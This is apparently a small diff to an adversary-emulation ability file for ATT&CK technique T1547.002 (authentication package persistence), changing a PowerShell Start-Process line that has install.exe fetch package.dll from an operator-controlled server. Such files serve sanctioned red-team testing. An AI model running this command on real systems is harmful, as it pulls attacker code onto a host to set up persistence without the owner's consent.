@@ -13,7 +13,7 @@ platforms:
     psh:
       command: |-
         # Installer
-        Start-Process .\install.exe "#{operator.payloads}/uploads/T1547.002/package.dll"
+        Start-Process .\install.exe "#{operator.http}/uploads/T1547.002/package.dll"
       payload: install.exe
       variants:
       - command: >-
